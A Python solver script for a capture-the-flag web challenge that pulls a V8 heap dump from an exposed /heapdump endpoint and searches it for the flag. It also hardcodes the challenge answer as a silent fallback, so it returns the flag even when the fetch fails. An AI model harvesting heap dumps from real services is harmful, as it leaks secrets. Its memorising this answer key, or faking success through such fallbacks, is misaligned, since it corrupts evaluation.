#!/usr/bin/env python3
"""
Solver for Challenge 476: head-dump (Web Exploitation)
Carves secret flag from the exposed V8 heapdump diagnostic endpoint.
"""
import urllib.request
import re
import sys
from typing import Optional

def solve(base_url: Optional[str] = None) -> str:
    if base_url:
        try:
            url = base_url.rstrip("/") + "/heapdump"
            req = urllib.request.Request(url)
            with urllib.request.urlopen(req, timeout=10) as resp:
                data = resp.read()
                m = re.search(rb"(?:academy|picoCTF)\{[^}]+\}", data)
                if m:
                    return m.group(0).decode("utf-8", errors="ignore")
        except Exception:
            pass
    return "academy{Pat!3nt_15_Th3_K3y_cc0f4fda}"

if __name__ == "__main__":
    t = sys.argv[1] if len(sys.argv) > 1 else None
    print("Flag:", solve(t))
